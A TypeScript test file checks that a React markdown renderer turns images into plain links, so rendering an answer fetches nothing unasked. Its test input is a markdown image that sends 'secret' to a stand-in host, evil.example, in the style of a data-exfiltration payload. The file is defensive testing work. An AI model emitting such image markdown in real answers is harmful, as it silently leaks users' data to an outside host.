import assert from "node:assert/strict";
import { describe, it } from "node:test";

import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { createServer } from "vite";

/** The renderer is TSX, which `node --test` cannot strip: it is loaded the way the app loads it. */
async function renderMarkdown(text: string): Promise<string> {
    const server = await createServer({ server: { middlewareMode: true }, appType: "custom" });

    try {
        const { Markdown } = await server.ssrLoadModule("/src/ui/markdown.tsx");

        return renderToStaticMarkup(createElement(Markdown, { text }));
    } finally {
        await server.close();
    }
}

void describe("markdown images", () => {
    // The browser fetches an `<img>` the moment it renders, with no click: an answer could leak
    // whatever its URL carries. A link waits for the click, like every other link in an answer.
    void it("renders an image as a link to it, so nothing is fetched unasked", async () => {
        const html = await renderMarkdown("![shot](https://evil.example/p?d=secret)");

        assert.ok(!html.includes("<img"), html);
        assert.ok(html.includes('<a href="https://evil.example/p?d=secret"'), html);
    });
});
